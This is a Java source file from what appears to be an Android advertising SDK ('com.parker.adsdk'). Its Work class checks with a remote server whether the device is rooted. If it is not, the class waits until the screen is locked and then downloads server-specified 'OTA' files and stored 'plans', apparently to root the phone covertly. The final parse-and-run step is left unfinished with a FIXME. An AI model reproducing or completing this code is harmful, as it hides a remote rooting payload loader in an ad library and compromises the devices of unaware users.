package com.parker.adsdk.work;

import android.app.AlarmManager;
import android.app.KeyguardManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.preference.PreferenceManager;

import com.parker.adsdk.RootHelper;
import com.parker.adsdk.entity.WorkPlan;
import com.parker.adsdk.network.RequestUtil;
import com.parker.adsdk.util.LogUtil;
import com.parker.adsdk.util.ServiceUtils;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

/**
 * Created by thinkpad on 2016/8/9.
 */
public class Work {
    private Context context;
    private File otaName;
    private File work;
    private String otaUrl;
    private File otaDir;
    private long extra_start_time;
    private long extra_end_time;
    private String extra_trigger;
    private int exe_time;
    public Work(Context context) {
        super();
        this.context = context;
        this.exe_time = 0;
    }

    public Work(Context context, long extra_start_time, long extra_end_time, String extra_trigger) {
        this.context = context;
        this.extra_start_time = extra_start_time;
        this.extra_end_time = extra_end_time;
        this.extra_trigger = extra_trigger;
        this.exe_time = 1;
    }

    public void run() {
        LogUtil.append("正在检测R状态...");
        String resp = RequestUtil.requstInit(this.context);
        try {
            JSONObject jsonObject = new JSONObject(resp);
            if(jsonObject.optJSONObject("result").optInt("code") != 0) {
                LogUtil.append("停止R，错误代码：" + jsonObject.optJSONObject("result").optInt("code"));
                this.context.sendBroadcast(new Intent("org.admobile.helper.intent.finish"));
                return;
            }

            if(ServiceUtils.isRoot(this.context, jsonObject)) {
                this.context.sendBroadcast(new Intent("org.admobile.helper.intent.r.status").putExtra(
                        "status", true));
                LogUtil.append("已R, 停止流程");
                this.context.sendBroadcast(new Intent("org.admobile.helper.intent.finish"));
            }
            else {
                LogUtil.append("未R");
                this.trigger();
            }

            return;
        }
        catch(Exception e) {
            return;
        }
    }

    private void trigger() {
        if(this.exe_time == 0) {
            LogUtil.append("执行类型：立即执行");
            this.exec();
        }
        else {
            if(RootHelper.DEBUG) {
                LogUtil.append("执行类型：定时执行");
                LogUtil.append("定时执行触发条件：" + this.extra_trigger);
            }

            if(this.extra_trigger.equals("lock")) {
                if(((KeyguardManager)context.getSystemService(Context.KEYGUARD_SERVICE)).inKeyguardRestrictedInputMode()) {
                    LogUtil.append("已锁屏，开始执行");
                    this.exec();
                    return;
                }

                LogUtil.append("未锁屏，延后１小时执行");
                this.extra_start_time += 3600000;
                if(this.extra_start_time > this.extra_end_time) {
                    LogUtil.append("已超过最晚时间，放弃R");
                    return;
                }

                AlarmManager alarmManager = (AlarmManager) this.context.getSystemService(Context.ALARM_SERVICE);
                Intent intent = new Intent("com.admonet.helper.timing.work.start");
                intent.putExtra("extra_start_time", this.extra_start_time);
                intent.putExtra("extra_end_time", this.extra_end_time);
                intent.putExtra("extra_trigger", this.extra_trigger);
                PendingIntent pendingIntent = PendingIntent.getBroadcast(this.context, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT);
                alarmManager.cancel(pendingIntent);
                alarmManager.set(0, this.extra_start_time, pendingIntent);
                LogUtil.append("时间设置为:" + this.extra_start_time);
                return;
            }

            this.exec();
        }
    }

    private void exec()
    {
        LogUtil.append("正在获取数据...");
        String resp = RequestUtil.requestOta(this.context);
        ArrayList<WorkPlan> plans = new ArrayList();
        plans.addAll(this.getStoredPlans());
        plans.addAll(this.parseNewPlan(resp));
        this.storeAllPlans(plans);
        FileInputStream fis;
        try {
            LogUtil.append("获取OTA数据...");
            RequestUtil.downloadPlus(this.context, 0, this.otaUrl, this.otaName, this.getOtaMd5(resp));
            fis = new FileInputStream(this.otaName);
            LogUtil.append("正在解析数据...");
            //// FIXME: 2016/8/22 
        }
        catch(Exception e) {



        }

    }


    private String getOtaMd5(String jsonStr) {
        String result;
        try {
            result = new JSONObject(jsonStr).optString("otaMd5");
        }
        catch(Exception e) {
            result = "";
        }

        return result;
    }



    private void storeAllPlans(List<WorkPlan> plans) {
        LogUtil.append("存储所有方案...");
        JSONArray jsonArray = new JSONArray();
        Iterator<WorkPlan> it = plans.iterator();
        while(it.hasNext()) {
            jsonArray.put(it.next().pack());
        }

        PreferenceManager.getDefaultSharedPreferences(this.context).edit().putString("plans", jsonArray.toString())
                .apply();
    }

    private List<WorkPlan> getStoredPlans() {
        LogUtil.append("获取已存储方案...");
        ArrayList<WorkPlan> result = new ArrayList();
        String str = PreferenceManager.getDefaultSharedPreferences(this.context).getString("plans", null);
        try {
            JSONArray workPlans = new JSONArray(str);
            for(int i = 0; i < workPlans.length(); ++i) {
                result.add(new WorkPlan(workPlans.optJSONObject(i)));
            }
        }
        catch(Exception e) {
        }

        Iterator<WorkPlan> it = result.iterator();
        while(it.hasNext()) {
            WorkPlan workPlan = it.next();
            if(workPlan.getState() != 1) {
                continue;
            }

            workPlan.setState(0);
        }

        return result;
    }

    private List<WorkPlan> parseNewPlan(String str) {
        LogUtil.append("解析新方案...");
        ArrayList<WorkPlan> result = new ArrayList();
        try {
            JSONObject jsonObject = new JSONObject(str);
            String otaName = jsonObject.optString("otaName", "");
            JSONArray plan = jsonObject.optJSONArray("plan");
            for(int i = 0; i < plan.length(); ++i) {
                result.add(new WorkPlan(plan.optJSONObject(i)));
            }

            this.otaUrl = jsonObject.optString("otaUrl");
            this.otaDir = this.context.getDir("ota", 3);
            this.otaDir.mkdir();
            this.otaName = new File(this.context.getFilesDir(), otaName);
            this.work = new File(this.context.getFilesDir(), "work");

        }
        catch(Exception e) {
        }
        return result;
    }


}
